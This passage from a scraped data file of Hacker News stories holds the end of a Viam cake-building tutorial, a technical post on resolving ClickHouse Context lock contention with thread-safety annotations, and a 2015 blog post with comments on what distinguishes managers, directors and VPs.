{num}\\nSee Hazal after the party\\nfor your picture\\n\\n\\n\\n\\n\\n”)time.sleep(0.1)print(“now started detecting again”)Design your interactive cake, looks matter!Now that we have our electronics wired and tested, we prototyped how the cake is going to look in Tinkercad with the accurate dimensions of the components.After the design process, we had a baseline of how the cake is going to look. We wanted to enclose our electronics under the cake and for the ones that are going to be embedded in the cake, we wanted to 3D print covers for it so this step was not just helpful but also necessary.Full codeYou can see the full code in the repository. You should replace your machine’s API key and API key ID if you want to run the same code for your own smart machine.Assembling the cakeNow that the technical parts are done, we started to assemble the cake itself. I did some taste-test sessions which were super yummy.These are the photos from the assembly process:Final resultYou can see it in action here (and half-eaten):Honestly, I had the best time in the world building this with Abigail. Let me know if you attempt to make one and can’t wait to see all the photos taken with your new smart machine.If this is not your cup of cake, you can head over to our Tutorials page and try one of the other Viam tutorials to continue building other robots. If you have questions or want to meet other people working on robots, you should join our Community Discord!",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "b37da0c384f5a905",
    "title": {
      "en": "Lock Contention",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://maksimkita.com/blog/lock-contention.html",
    "score": 88,
    "by": "stacyz",
    "time": 1742230028,
    "content": "Lock Contention\n\n        17 Mar 2025\n\n    Overview\n\nRecently, I revisited Resolving a year-long ClickHouse lock contention post and spoke about it\nat C++ Russia 2025 conference.\n\nI wanted to provide more information about the development process and some technical details that were not covered in the original post.\n\nMotivation\n\nIn 2022 in Tinybird, there was a huge CPU underutilization in one of our clusters during the high load period.\n\nIt was unclear what was the issue. There were no IO/Network/Memory bottlenecks. In ClickHouse all async metrics and query profile events were normal.\nThe only unusual thing was that with increased queries throughput, ClickHouse could not handle the load, and CPU usage was very low.\n\nThe problem continued for a year and during similar incidents, we could not find any clues.\n\nOne year later during a similar incident, we spotted that ContextLockWait async metric periodically increased. Async metrics are calculated periodically with some interval and include for example memory usage, and some global metrics. Client can read them using system.asynchronous_metrics table. And one of such metrics is ContextLockWait, it tells you how many threads are waiting for a Context lock.\n\nIt is normal that during high load such metric can increase because of increased contention on Context lock. But it was very unusual because the normal value of this metric is around 0, so I started to investigate the issue from the ClickHouse internals side.\n\nDuring the incident, I periodically dumped all threads stack traces to understand how many threads were blocked on lock inside Context. It is possible to dump all threads stack traces in ClickHouse using system.stack_trace table and the following query:\n\nWITH arrayMap(x -> demangle(addressToSymbol(x)), trace) AS all\nSELECT thread_name, thread_id, query_id, arrayStringConcat(all, '\\n') AS res\nFROM system.stack_trace LIMIT 1 FORMAT Vertical;\n\nRow 1:\n──────\nthread_name: clickhouse-serv\nthread_id:   125441\nquery_id:\nres:         pthread_cond_wait\nstd::__1::condition_variable::wait(std::__1::unique_lock<std::__1::mutex>&)\nBaseDaemon::waitForTerminationRequest()\nDB::Server::main(/*arguments*/)\nPoco::Util::Application::run()\nDB::Server::run()\nPoco::Util::ServerApplication::run(int, char**)\nmainEntryClickHouseServer(int, char**)\nmain\n__libc_start_main\n_start\n\nEvery 10-15 seconds I dumped all threads stack traces to later check if there were any patterns where threads were spending time. After the incident, I was able to see that most of the threads were blocked on Context class methods that needed to take a Context lock, for example Context::getSettings().\n\nAfter that I was almost sure that the problem was in Context lock contention and started to investigate this particular lock.\n\nAdding ContextLockWaitMicroseconds\n\nIn ClickHouse there are per query profile events that are defined like this:\n\nM(GlobalThreadPoolJobs,\n  \"Counts the number of jobs that have been pushed to the global thread pool.\",\n  ValueType::Number) \\\n\nM(GlobalThreadPoolLockWaitMicroseconds,\n  \"Total time threads have spent waiting for locks in the global thread pool.\",\n  ValueType::Microseconds) \\\n\nM(GlobalThreadPoolJobWaitTimeMicroseconds,\n  \"Measures the elapsed time from when a job is scheduled in the thread pool to when it is picked up\n  for execution by a worker thread. This metric helps identify delays in job processing, indicating\n  the responsiveness of the thread pool to new tasks.\",\n  ValueType::Microseconds) \\\n\nM(LocalThreadPoolLockWaitMicroseconds,\n  \"Total time threads have spent waiting for locks in the local thread pools.\",\n   ValueType::Microseconds) \\\n\nAs you can see they can have different types like ValueType::Number or ValueType::Microseconds. We already have a lot of metrics for locks for which we can have heavy contention. For example,\nyou can see that there is GlobalThreadPoolLockWaitMicroseconds event that allows you to see how much time threads spend waiting for locks in the global thread pool. Unfortunately,\nfor Context lock we did not have a similar metric, we only had ContextLock event that tells you how many times the Context lock was acquired or tried to acquire. It is not enough to\nunderstand if there is a problem with Context lock contention, because it is expected that query can take this lock many times during query execution to read query settings, query current database, etc. We need a metric that tells us how much time threads in the query spend waiting for a Context lock, similar to the GlobalThreadPoolLockWaitMicroseconds event.\n\nThe first step was to add the ContextLockWaitMicroseconds event to profile events in https://github.com/ClickHouse/ClickHouse/pull/55029:\n\nM(ContextLock,\n    \"Number of times the lock of Context was acquired or tried to acquire. This is global lock.\",\n    ValueType::Number) \\\n\nM(ContextLockWaitMicroseconds,\n    \"Context lock wait time in microseconds\",\n    ValueType::Microseconds) \\\n\nDuring the development of the pull request, I already discovered that the problem was in the Context lock because I was able to reproduce performance issue locally using the ContextLockWaitMicroseconds metric to track the amount of time threads in the query spend waiting for the Context lock.\n\nI took an example query that takes 5 milliseconds to execute:\nSELECT UserID, count(*) FROM (SELECT * FROM hits_clickbench LIMIT 10) GROUP BY UserID\n0 rows in set. Elapsed: 0.005 sec.\n\nAnd tried to run 200 such queries concurrently for a couple of minutes:\nclickhouse-benchmark --query=\"SELECT UserID, count(*) FROM (SELECT * FROM hits_clickbench LIMIT 10)\nGROUP BY UserID\" --concurrency=200\n\nAnd checked the results:\nSELECT quantileExact(0.5)(lock_wait_milliseconds), max(lock_wait_milliseconds) FROM\n(\n    SELECT (ProfileEvents['ContextLockWaitMicroseconds'] / 1000.0) AS lock_wait_milliseconds\n    FROM system.query_log WHERE lock_wait_milliseconds > 0\n)\n\n┌─quantileExact(0.5)(lock_wait_milliseconds)─┬─max(lock_wait_milliseconds)──┐\n│                                     17.452 │                      382.326 │\n└────────────────────────────────────────────┴──────────────────────────────┘\n\nAs you can see, some queries wait for the Context lock for 382 milliseconds, and the median wait time is 17 milliseconds, which is unacceptable.\n\nContext Lock Redesign\n\nThere are actually two types of Context in ClickHouse:\n\n    ContextSharedPart is responsible for storing and providing access to global shared objects that are shared between all sessions and queries, for example: Thread pools,\nServer paths, Global trackers, Clusters information.\n\n    Context is responsible for storing and providing access to query or session-specific objects, for example: query settings, query caches, query current database.\n\nArchitecture before redesign looked like this:\n\nThe problem was that a single mutex was used for most of the synchronization between Context and ContextSharedPart, even when we worked with objects local to Context. For example, when a thread wants to read local query settings from Context, it needs to lock the ContextSharedPart mutex, which leads to huge contention if there is a high number of low latency queries.\n\nDuring query execution, ClickHouse can create a lot of Contexts because each subquery in ClickHouse can have unique settings. For example:\nSELECT id, value\nFROM (\n    SELECT id, value\n    FROM test_table\n    SETTINGS max_threads = 16\n)\nWHERE id > 10\nSETTINGS max_threads = 32\n\nIn this example, we want to execute the inner subquery with max_threads = 16 and the outer subquery with max_threads = 32. A large number of low latency, concurrent queries with many subqueries will create a lot of Contexts per query, and the problem will become even bigger.\n\nIt is actually common to have global Context or ApplicationContext classes in projects and put everything in them. When synchronization is required, it is usually implemented initially with a single mutex. But later, if lock contention becomes an issue, it needs to be redesigned to use a more sophisticated approach.\n\nThe idea was to replace a single global mutex with two read-write mutexes readers–writer lock. One global read-write mutex for ContextSharedPart and one local read-write mutex for each Context.\n\nRead-write mutexes are used because we usually do a lot of concurrent reads (for example, read settings or some path) and rarely concurrent writes. For example, for ContextSharedPart object, we could rewrite some fields during configuration hot reload, but it is very rare. For Context object during query execution query current database, query settings are almost never changed after the query is parsed and analyzed.\n\nIn many places, I completely got rid of synchronization where it was used for initialization of some objects and used call_once for objects that are initialized only once.\n\nContext lock redesign was implemented in the scope of the pull request: https://github.com/ClickHouse/ClickHouse/pull/55121.\n\nHere is how the architecture looks after redesign:\n\nThread Safety Analysis\n\nContext lock redesign was conceptually very simple, but it was very hard to implement it correctly without introducing synchronization issues. ContextSharedPart and Context both contain a lot of fields and methods with complex synchronization logic and it was very hard to properly split synchronization between them manually. It was unclear how to be sure that all locks were used properly and that there were no synchronization issues after refactoring.\n\nThe solution was to use Clang Thread Safety Analysis and add necessary annotations to mutexes, fields, and methods of Context and ContextSharedPart. Now I want to explain in detail how this was done and what problems I had.\n\nTo use Clang thread safety analysis, compile your code with the -Wthread-safety flag. In production, you need to use -Werror or mark this particular thread-safety warning as an error.\n\nclang -c -Wthread-safety example.cpp\n\nIn Clang thread safety analysis documentation, there is an example of how to use thread safety annotations:\n\nclass BankAccount {\nprivate:\n    Mutex mu;\n    int   balance GUARDED_BY(mu);\n\n    void depositImpl(int amount) /* TO FIX: REQUIRES(mu) */ {\n        balance += amount;       // WARNING! Cannot write balance without locking mu.\n    }\n\n    void withdrawImpl(int amount) REQUIRES(mu) {\n        balance -= amount;       // OK. Caller must have locked mu.\n    }\n\npublic:\n    void withdraw(int amount) {\n        mu.Lock();\n        withdrawImpl(amount);    // OK.  We've locked mu.\n        /* TO FIX: mu.unlock() or use std::lock_guard */\n    }                          // WARNING!  Failed to unlock mu.\n\n    void transferFrom(BankAccount& b, int amount) {\n        mu.Lock();\n        /* TO FIX: lock() and unlock() b.mu potentially use std::lock_guard*/\n        b.withdrawImpl(amount);  // WARNING!  Calling withdrawImpl() requires locking b.mu.\n        depositImpl(amount);     // OK.  depositImpl() has no requirements.\n        mu.Unlock();\n    }\n};\n\nI added TO FIX comments to fix warnings in places where you will see warnings after running thread safety analysis. Here are the most important concepts from Clang\nthread safety analysis documentation:\n\n  Thread safety analysis provides a way of protecting resources with capabilities.\nA resource is either a data member, or a function/method that provides access to some underlying resource.\nThe analysis ensures that the calling thread cannot access the resource (i.e. call the function, or read/write the data) unless it has the capability to do so.\n\n  A thread may hold a capability either exclusively or shared. An exclusive capability can be held by only one thread at a time,\nwhile a shared capability can be held by many threads at the same time. This mechanism enforces a multiple-reader, single-writer pattern.\nWrite operations to protected data require exclusive access, while read operations require only shared access.\n\n  Capabilities are associated with named C++ objects which declare specific methods to acquire and release the capability. The name of\nthe object serves to identify the capability. The most common example is a mutex. For example, if mu is a mutex,\nthen calling mu.Lock() causes the calling thread to acquire the capability to access data that is protected by mu.\nSimilarly, calling mu.Unlock() releases that capability.\n\nClang thread safety annotations can be split into three different categories. Here are the most commonly used annotations:\n\n  For the implementation of capability classes and functions: CAPABILITY(...), SCOPED_CAPABILITY, ACQUIRE(…),\nACQUIRE_SHARED(…), RELEASE(…), RELEASE_SHARED(…), RELEASE_GENERIC(…)\n  For protecting fields and methods: GUARDED_BY(...), PT_GUARDED_BY(...), REQUIRES(…), REQUIRES_SHARED(…)\n  Utility: NO_THREAD_SAFETY_ANALYSIS\n\nThose annotations are very flexible and allow you to combine them in different ways. For example, you can use REQUIRES annotation that takes multiple mutexes:\n\nMutex mutex_1, mutex_2;\nint a GUARDED_BY(mutex_1);\nint b GUARDED_BY(mutex_2);\n\nvoid test() REQUIRES(mutex_1, mutex_2) {\n    a = 0;\n    b = 0;\n}\n\nIn the LLVM standard library, all mutex implementations are annotated with thread safety annotations. Example std::mutex:\n\nclass _LIBCPP_TYPE_VIS _LIBCPP_THREAD_SAFETY_ANNOTATION(capability(\"mutex\")) mutex\n{\n    __libcpp_mutex_t __m_ = _LIBCPP_MUTEX_INITIALIZER;\n\npublic:\n    _LIBCPP_INLINE_VISIBILITY\n    _LIBCPP_CONSTEXPR mutex() = default;\n\n    mutex(const mutex&) = delete;\n    mutex& operator=(const mutex&) = delete;\n\n#if defined(_LIBCPP_HAS_TRIVIAL_MUTEX_DESTRUCTION)\n    ~mutex() = default;\n#else\n    ~mutex() _NOEXCEPT;\n#endif\n\n    void lock() _LIBCPP_THREAD_SAFETY_ANNOTATION(acquire_capability());\n    bool try_lock() _NOEXCEPT _LIBCPP_THREAD_SAFETY_ANNOTATION(try_acquire_capability(true));\n    void unlock() _NOEXCEPT _LIBCPP_THREAD_SAFETY_ANNOTATION(release_capability());\n\n    typedef __libcpp_mutex_t* native_handle_type;\n    _LIBCPP_INLINE_VISIBILITY native_handle_type native_handle() {return &__m_;}\n};\n\nClang thread safety analysis is a great tool for catching synchronization errors in code. However, it can have some problems for production usage out of the box.\n\nClickHouse has its own implementation of some synchronization primitives, such as the implementation of std::shared_mutex, because the standard library implementation is slow. We also want to have mutexes with additional logic during lock/unlock, such as updating metrics or profile events. In both cases, we do not want to have a lot of duplicated thread safety annotations in all of our mutexes. We want to hide them and have a generic solution.\n\nTo solve this problems, I designed SharedMutexHelper template class using CRTP pattern that implements SharedMutex standard library requirements https://en.cppreference.com/w/cpp/named_req/SharedMutex and adds thread safety annotations.\n\ntemplate <typename Derived, typename MutexType = SharedMutex>\nclass TSA_CAPABILITY(\"SharedMutexHelper\") SharedMutexHelper\n{\n    auto & getDerived() { return static_cast<Derived &>(*this); }\n\npublic:\n    // Exclusive ownership\n    void lock() TSA_ACQUIRE() { getDerived().lockImpl(); }\n\n    bool try_lock() TSA_TRY_ACQUIRE(true) { getDerived().tryLockImpl(); }\n\n    void unlock() TSA_RELEASE() { getDerived().unlockImpl(); }\n\n    // Shared ownership\n    void lock_shared() TSA_ACQUIRE_SHARED() { getDerived().lockSharedImpl(); }\n\n    bool try_lock_shared() TSA_TRY_ACQUIRE_SHARED(true) { getDerived().tryLockSharedImpl(); }\n\n    void unlock_shared() TSA_RELEASE_SHARED() { getDerived().unlockSharedImpl(); }\n\nprotected:\n    /// Default implementations for all *Impl methods.\n    void lockImpl() TSA_NO_THREAD_SAFETY_ANALYSIS { mutex.lock(); }\n\n    ...\n\n    void unlockSharedImpl() TSA_NO_THREAD_SAFETY_ANALYSIS { mutex.unlock_shared(); }\n\n    MutexType mutex;\n};\n\nSharedMutexHelper implements all necessary methods for SharedMutex requirements and, by default, delegates all methods to MutexType implementation. The derived class must subclass SharedMutexHelper and override only the necessary lockImpl, tryLockImpl, unlockImpl, lockSharedImpl, tryLockSharedImpl, and unlockSharedImpl methods.\n\nHere is a concrete implementation of ContextSharedMutex:\n\nclass ContextSharedMutex : public SharedMutexHelper<ContextSharedMutex>\n{\nprivate:\n    using Base = SharedMutexHelper<ContextSharedMutex, SharedMutex>;\n    friend class SharedMutexHelper<ContextSharedMutex, SharedMutex>;\n\n    void lockImpl()\n    {\n        ProfileEvents::increment(ProfileEvents::ContextLock);\n        CurrentMetrics::Increment increment{CurrentMetrics::ContextLockWait};\n        Stopwatch watch;\n        Base::lockImpl();\n        ProfileEvents::increment(ProfileEvents::ContextLockWaitMicroseconds,\n            watch.elapsedMicroseconds());\n    }\n\n    void lockSharedImpl()\n    {\n        ProfileEvents::increment(ProfileEvents::ContextLock);\n        CurrentMetrics::Increment increment{CurrentMetrics::ContextLockWait};\n        Stopwatch watch;\n        Base::lockSharedImpl();\n        ProfileEvents::increment(ProfileEvents::ContextLockWaitMicroseconds,\n            watch.elapsedMicroseconds());\n    }\n};\n\nAs you can see, ContextSharedMutex overrides only lockImpl and lockSharedImpl methods and, in these methods, updates metrics.\n\nAnother problem was that in the LLVM standard library, std::shared_lock does not support thread safety analysis. This is probably because this class is movable, and thread safety annotations do not have support for movable locks. For example, std::unique_lock also does not support thread safety analysis.\n\nTo solve this issue, I implemented SharedLockGuard analog of std::lock_guard, but for shared mutexes:\n\ntemplate <typename Mutex>\nclass TSA_SCOPED_LOCKABLE SharedLockGuard\n{\npublic:\n    explicit SharedLockGuard(Mutex & mutex_) TSA_ACQUIRE_SHARED(mutex_)\n        : mutex(mutex_) { mutex_.lock_shared(); }\n\n    ~SharedLockGuard() TSA_RELEASE() { mutex.unlock_shared(); }\n\nprivate:\n    Mutex & mutex;\n};\n\nLet’s see an example of thread safety analysis usage in ContextSharedPart. We declare which fields are guarded by ContextSharedMutex mutex.\n\nstruct ContextSharedPart : boost::noncopyable\n{\n    /// For access of most of shared objects.\n    mutable ContextSharedMutex mutex;\n\n    /// Path to the data directory, with a slash at the end.\n    String path TSA_GUARDED_BY(mutex);\n\n    /// Path to the directory with some control flags for server maintenance.\n    String flags_path TSA_GUARDED_BY(mutex);\n\n    /// Path to the directory with user provided files, usable by 'file' table function.\n    String dictionaries_lib_path TSA_GUARDED_BY(mutex);\n\n    /// Path to the directory with user provided scripts.\n    String user_scripts_path TSA_GUARDED_BY(mutex);\n\n    /// Path to the directory with filesystem caches.\n    String filesystem_caches_path TSA_GUARDED_BY(mutex);\n\n    /// Path to the directory with user provided filesystem caches.\n    String filesystem_cache_user_path TSA_GUARDED_BY(mutex);\n\n    /// Global configuration settings.\n    ConfigurationPtr config TSA_GUARDED_BY(mutex);\n};\n\nThen, in ContextSharedPart methods that need to access guarded fields, we use SharedLockGuard for shared access or std::lock_guard for exclusive access:\n\nString Context::getPath() const\n{\n    SharedLockGuard lock(shared->mutex);\n    return shared->path;\n}\n\nString Context::getFlagsPath() const\n{\n    SharedLockGuard lock(shared->mutex);\n    return shared->flags_path;\n}\n\nString Context::getUserFilesPath() const\n{\n    SharedLockGuard lock(shared->mutex);\n    return shared->user_files_path;\n}\n\nString Context::getDictionariesLibPath() const\n{\n    SharedLockGuard lock(shared->mutex);\n    return shared->dictionaries_lib_path;\n}\n\nvoid Context::setPath(const String & path)\n{\n    std::lock_guard lock(shared->mutex);\n\n    shared->path = path;\n\n    if (shared->tmp_path.empty() && !shared->root_temp_data_on_disk)\n        shared->tmp_path = shared->path + \"tmp/\";\n\n    if (shared->flags_path.empty())\n        shared->flags_path = shared->path + \"flags/\";\n\n    if (shared->user_files_path.empty())\n        shared->user_files_path = shared->path + \"user_files/\";\n\n    if (shared->dictionaries_lib_path.empty())\n        shared->dictionaries_lib_path = shared->path + \"dictionaries_lib/\";\n\n    if (shared->user_scripts_path.empty())\n        shared->user_scripts_path = shared->path + \"user_scripts/\";\n}\n\nI implemented thread safety analysis refactoring in this pull request https://github.com/ClickHouse/ClickHouse/pull/55278.\n\nPerformance improvements\n\nIn Tinybird, we had a synthetic benchmark that contained a lot of low latency queries. We ran this benchmark with the old and new ClickHouse version (after Context lock redesign):\n\nclickhouse benchmark -r --ignore-error \\\n--concurrency=500 \\\n--timelimit 600 \\\n--connect_timeout=20 < queries.txt\n\nAnd had the following results:\n\n    Before ~200 QPS. After ~600 QPS (~3x better).\n\n    Before CPU utilization of only ~20%. After ~60% (~3x better).\n\n    Before median query time 1s. After ~0.6s (~2x better).\n\n    Before slowest queries took ~75s. After ~6s (~12x better).\n\nAs you can see in such benchmark, we were not able to utilize ClickHouse to 100% CPU usage because of low concurrency. We were able to fully utilize ClickHouse instance with --concurrency=1000 and had\naround ~1000 QPS and ~95-96% CPU utilization.\n\nWith more complex production queries, ClickHouse will most likely hit another bottleneck. However, we definitely removed Context lock contention as a potential bottleneck.\n\nConclusion\n\nLock contention is a very common source of performance issues in modern high concurrency systems. You can think of it the same way as a CPU/Memory/IO/Network bound, like the LockContention bound.\n\nTo detect such issues you can try to use off-cpu analysis and introduce additional application level metrics that will tell you how much time threads spend in different locks.\n\nIt is also a good idea to use all available tooling as much as possible, including runtime tools like address/memory/thread/undefined-behavior sanitizers and compile-time tools like Clang thread safety analysis.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "43e25f70b2789624",
    "title": {
      "en": "Career Development: What It Means to Be a Manager, Director, or VP (2015)",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://kellblog.com/2015/03/08/career-development-what-it-really-means-to-be-a-manager-director-or-vp/",
    "score": 514,
    "by": "AnhTho_FR",
    "time": 1742554181,
    "content": "← Why Can't PR People Do Math?\n\t\t\tA Disney Parking Lot Attendant Gets More Training than Your Typical $250K Enterprise Sales Rep:  Thoughts on Bootcamps →\n\n\t\t\tCareer Development: What It Really Means to be a Manager, Director, or VP\n\n\t\t\t\t\tPosted on March 8, 2015 | 36 Comments\n\n\t\t\t\tIt’s no secret that I’m not a fan of big-company HR practices. I’m more of the First Break all the Rules type. Despite my general skepticism of many standard practices, we still do annual performance reviews at my company, though I’m thinking seriously of dropping them. (See Get Rid of the Performance Review.)\nAnother practice I’m not hugely fond of is “leveling” — the creation of a set of granular levels to classify jobs across the organization. Leveling typically results in something that looks like this:\n\nWhile I am a huge fan of compensation benchmarking (i.e., figuring out what someone is worth in the market before they do by getting another job), I think classical leveling has a number of problems:\n\nIt’s futile to level across functions. Yes, you might discover that a Senior FPA Analyst II earns the same as a Product Marketing Director I, but why does that matter? It’s a coincidence. It’s like saying with $3.65 I can buy either a grande non-fat latte or a head of organic lettuce. What matters is the fair price of each of those goods in the market — not they that happen to have the same price. So I object to the whole notion of levels across the organization. It’s not canonical; it’s coincidence.\n\nMost leveling systems are too granular, with the levels separated by arbitrary characterizations. It’s makework. It’s fake science. It’s bureaucratic and encourages a non-thinking “climb the ladder” approach to career development. (“Hey, let’s develop you to go from somewhat-independent to rather-independent this year.”)\n\nIt conflates career development and salary negotiation. It encourages a mindset of saying, “what must I do to make L10” when you want to say, “I want a $10K raise.” I can’t tell you the number of times people have asked me for “development” or “leveling” conversations where I get excited and start talking about learning, skills gaps, and such and it’s clear all they wanted to talk about was salary. Disappointing.\n\nThat said, I do believe there are three meaningful levels in management and it’s important to understand the differences among them. I can’t tell you the number of times someone has sincerely asked me, “what does it take to be a director?” or, “how can I develop myself into a VP?”\nIt’s a hard question. You can turn to the leveling system for an answer, but it’s not in there. For years, in fact, I’ve struggled to find what I consider to be a good answer to the question.\nI’m not talking about Senior VP vs. Executive VP or Director vs. Senior Director. I view such adjectives as window dressing or stripes: important recognition along the way, but nothing that fundamentally changes one’s level.\nI’m not talking about how many people you manage. In call centers, a director might manage 500 people. In startups, a VP might manage zero.\nI am talking about one of three levels at which people operate: manager, director, and vice president. Here are my definitions:\n\nManagers are paid to drive results with some support. They have experience in the function, can take responsibility, but are still learning the job and will have questions and need support. They can execute the tactical plan for a project but typically can’t make it.\n\nDirectors are paid to drive results with little or no supervision (“set and forget”). Directors know how to do the job. They can make a project’s tactical plan in their sleep. They can work across the organization to get it done. I love strong directors. They get shit done.\n\nVPs are paid to make the plan. Say you run marketing. Your job is to understand the company’s business situation, make a plan to address it, build consensus to get approval of that plan, and then go execute it.\n\nThe biggest single development issue I’ve seen over the years is that many VPs still think like directors. [1]\nSay the plan didn’t work. “But, we executed the plan we agreed to,” they might say, hoping to play a get-out-of-jail-free card with the CEO (which is about to boomerang).\nOf course, the VP got approval to execute the plan. Otherwise, you’d be having a different conversation, one about termination for insubordination.\nBut the plan didn’t work. Because directors are primarily execution engines, they can successfully play this card. Fair enough. Good directors challenge their plans to make them better. But they can still play the approvalcard successfully because their primary duty is to execute the plan, not make it.\nVP’s, however, cannot play the approval card. The VP’s job is to get the right answer. They are the functional expert. No one on the team knows their function better than they do. And even if someone did, they are still playing the VP of function role and it’s their job – and no one else’s — to get the right answer.\nNow, you might be thinking, “glad I don’t work for Dave” right now — he’s putting failure of a plan to which he and the team agreed on the back of the VP. And I am.\nBut it’s the same standard to which the CEO is held. If the CEO makes a plan, gets it approved by the board, and executes it well but it doesn’t work, they cannot tell the board “but, but, it’s the plan we agreed to.” Most CEOs wouldn’t even dream of saying that. It’s because CEOs understand they are held accountable not for effort or activity, but results.\nPart of truly operating at the VP level is to internalize this fact. You are accountable for results. Make a plan that you believe in. Because if the plan doesn’t work, you can’t hide behind approval. Your job was to make a plan that worked. If the risk of dying on a hill is inevitable, you may as well die on your own hill, and not someone else’s.\nParaphrasing the ancient Fram oil filter commercial, I call this “you can fire me now or fire me later” principle. An executive should never sign up for a plan they don’t believe in. They should risk being fired now for refusing to sign up for the plan (e.g., challenging assumptions, delivering bad news) as opposed to halfheartedly executing a plan they don’t believe in and almost certainly getting fired for its failure later. The former is a far better way to go than the latter.\nThis is important not only because it prepares the VP to one day become a CEO, but also because it empowers the VP in making their plan. If this my plan, if I am to be judged on its success or failure, if I am not able to use approval as a get-out-of-jail-free card, then is it the right plan?\nThat’s the thinking I want to stimulate. That’s how great VPs think.\n# # #\nFootnotes:\n[1] Since big companies throw around the VP title pretty casually, this post is arguing that many of those VPs are actually directors in thinking and accountability. This may be one reason why big company VPs have trouble adapting to the e-staff of startups.\nShare this:TwitterLinkedInEmailPrintMorePinterest1FacebookLike this:Like Loading...\n\n\tRelated\nThings to Avoid in Selecting an Executive-Level Job at a Software StartupAugust 13, 2019In \"Career\"Why Google Employees QuitJanuary 29, 2009In \"Google\"A Missive to Human Resources (HR)August 20, 2014In \"Management\"\n\n\t\t\t\t\t\t\tThis entry was posted in Career, HR, Leadership, Management, Startups. Bookmark the permalink.\n\n\t\t\t← Why Can't PR People Do Math?\n\t\t\tA Disney Parking Lot Attendant Gets More Training than Your Typical $250K Enterprise Sales Rep:  Thoughts on Bootcamps →\n\n\t\t\t36 responses to “Career Development: What It Really Means to be a Manager, Director, or VP”\n\n\t\t\tUmesh\n\n\t\t\t\t|\n\n\t\t\t\tMarch 8, 2015 at 8:56 am\n\t\t\t\t\t|\n\t\t\t\t\tReply\n\n\t\tGreat!  Gives a reality check for someone to know where they fit.\nEnjoyed it as always…not to miss out learning points from you.\nThanks\nUmesh\n\nLoading...\n\n\t\t\tRay Carroll (@raycarroll55)\n\n\t\t\t\t|\n\n\t\t\t\tApril 19, 2015 at 10:30 am\n\t\t\t\t\t|\n\t\t\t\t\tReply\n\n\t\tDave – this is well put. If you’re in a functional department (let’s say marketing), is their a level about the VP level that you’d define? For example, let’s say there is a CMO and VP of Marketing. If the VP of Marketing is making the plan, what is the CMO doing in your eyes?\n\nLoading...\n\n\t\t\teli\n\n\t\t\t\t|\n\n\t\t\t\tMay 13, 2015 at 5:53 am\n\t\t\t\t\t|\n\t\t\t\t\tReply\n\n\t\tVery good read, thank-you.\n\nLoading...\n\n\t\tPingback: Best of Kellblog 2015 | Kellblog\n\n\t\t\tDave\n\n\t\t\t\t|\n\n\t\t\t\tJanuary 1, 2016 at 5:05 pm\n\t\t\t\t\t|\n\t\t\t\t\tReply\n\n\t\tEnjoyed the article, thanks for posting!\n\nLoading...\n\n\t\tPingback: 2 – Career Development: What It Really Means to Be a Manager, Director, or VP\n\n\t\t\tNadim Hossain (@NadimHossain)\n\n\t\t\t\t|\n\n\t\t\t\tJanuary 8, 2016 at 2:05 pm\n\t\t\t\t\t|\n\t\t\t\t\tReply\n\n\t\tGreat piece Dave!\nAnd Ray – great question about CMOs vs VPs. In my experience, at small companies/startups, they are they same. I.e., CMO is a feel good title. At a larger company, you might have a VP of Demand Gen, who makes the plan for DG, and a VP of Corporate Marketing, who makes the plan for brand. You might also have regional or BU heads of marketing, reporting to a CMO.\n\nLoading...\n\n\t\tPingback: Mattermark Daily - Monday, January 11th, 2016 | Mattermark\n\n\t\t\tRaza Usman\n\n\t\t\t\t|\n\n\t\t\t\tJanuary 26, 2016 at 7:31 am\n\t\t\t\t\t|\n\t\t\t\t\tReply\n\n\t\tThe VP requires creativity creativity and foresight to envision a future state. Directors require creativity but can get by with less foresight.\n\nLoading...\n\n\t\t\tJim Franklin (@jimfranklin)\n\n\t\t\t\t|\n\n\t\t\t\tFebruary 22, 2016 at 5:39 pm\n\t\t\t\t\t|\n\t\t\t\t\tReply\n\n\t\tI have found the difference between VPs and Directors is that VPs think cross-functionally whereas Directors think almost exclusively about their functional area.\n\nLoading...\n\n\t\t\tRafael Varlese\n\n\t\t\t\t|\n\n\t\t\t\tMarch 9, 2017 at 1:38 pm\n\t\t\t\t\t|\n\t\t\t\t\tReply\n\n\t\tHello Dave,\nGood article and good points about grades and level structures. When you create clusters such as VP, Director and Manager, you are doing the same concept as grading and structures do…  Even your concept in my humble opinion, has some gaps… (you can have a Hands on Operations Director according to the role, and at the same time, an creative and strategic Marketing or Brand Manager, for e.g.)…. everything is relative and sometimes can’t fit in the grade, levels and even your classification (see, I totaly agree with your clusters). All these tools just help us to better compare and pay correclty without burn cash or loose talents to the market. Rgds from Brazil !!\n\nLoading...\n\n\t\t\tKamal Singarapu\n\n\t\t\t\t|\n\n\t\t\t\tAugust 17, 2017 at 12:34 am\n\t\t\t\t\t|\n\t\t\t\t\tReply\n\n\t\tThank you, Dave. This blog helped me to understand the purpose of different roles in a company.\n\nLoading...\n\n\t\tPingback: VP Marketing job description: My DIY version - Kevan Lee\n\n\t\tPingback: Alfred Lua\n\n\t\tPingback: Links: 4-17-2018 | Aaron Johnson\n\n\t\t\tCyrille Auxenfans\n\n\t\t\t\t|\n\n\t\t\t\tAugust 15, 2018 at 11:25 pm\n\t\t\t\t\t|\n\t\t\t\t\tReply\n\n\t\tGreat information shared about managing director and management thanks for it\n\nLoading...\n\n\t\tPingback: Top Kellblog Posts of 2018 | Kellblog\n\n\t\tPingback: The Real Difference Between a Director and Inside Sales Manager – suregist\n\n\t\tPingback: Whose Company Is It Anyway? Differences between Founders and Hired CEOs. - Enterprise Irregulars\n\n\t\tPingback: Whose Company Is It Anyway? Differences between Founders and Hired CEOs - OPEXEngine\n\n\t\tPingback: alper.nl\n\n\t\tPingback: Weekly Bullet #27 – Summary for the week – Performance Engineering Blog\n\n\t\tPingback: Advice for Engineering Managers Who Want to Climb the Ladder – charity.wtf\n\n\t\tPingback: Vidalytics: Marketing Project Manager  | JobSoko\n\n\t\tPingback: Remote Marketing Project Manager  at Vidalytics – US Jobs Alert\n\n\t\tPingback: Vidalytics: Marketing Project Manager  - Remote Jobs\n\n\t\tPingback: VidalyticsDigital Marketing Manager Aug 1Full-Time/Anywhere in the World – Scraper\n\n\t\tPingback: Vidalytics: Product Owner  - Work All Remote\n\n\t\tPingback: Vidalytics: Product Owner  | JobSoko\n\n\t\tPingback: VidalyticsProduct Owner  featuredFull-Time/Anywhere in the World – Scraper\n\n\t\tPingback: Vidalytics: Product 